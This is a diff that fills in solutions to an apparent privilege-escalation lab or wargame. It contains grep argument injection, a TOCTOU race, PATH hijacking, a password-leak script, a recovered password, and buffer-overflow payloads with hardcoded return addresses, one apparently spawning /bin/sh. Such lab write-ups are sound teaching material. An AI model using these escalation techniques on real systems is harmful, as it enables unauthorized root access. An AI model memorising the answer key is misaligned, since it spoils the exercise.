@@ -1,10 +1,12 @@
-Level 1: 
-Level 2: 
-Level 3: 
-Level 4: 
-Level 5: 
-Level 6: 
-Level 7: 
-Level 8: 
+Level 1: passing the escalate program after the parameter to the grep command made it execute the escalation
+Level 2: TOCTOU attack by changing the shell input after executing the program but before it checks the input
+Level 3: changed the PATH variable to include a directory with a malicious program named the same as python3
+Level 4: #!/usr/bin/bash
+password=$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | /levels/level4/level4 | grep "^Password was:" | cut -d' ' -f3)
+(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA${password}"; echo escalate; cat -) | /levels/level4/level4
+Level 5: XOR each byte from the arrays at <PASSWD_KEY_3> and <PASSWD_PWD_1> through inspecting get_password with gdb and then getting the values from the addresses --> SuperVerySecretPassword
+Level 6: buffer overflow which overrides the return address (since yo is 128 bytes and rbp is 8 bytes, we need an offset of 136) with (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*136 + b"\x89\x51\x55\x55\x55\x55\x00\x00\x0a")'; cat -) | ./level6
+Level 7: buffer overflow on the final variable with the secret (python3 -c 'import sys; sys.stdout.buffer.write(b"0\n" + b"A"*36 + b"\xcf\x2c\n")'; cat -) | ./level7
+Level 8: ??? (python3 -c 'import sys; sys.stdout.buffer.write(b"/bin/sh" + b"A"*(93 + 8) + b"\x50\x87\xc5\xf7\xff\x7f" + b"")'; cat -) | ./level8
 Level 9: 
 Level 10: 
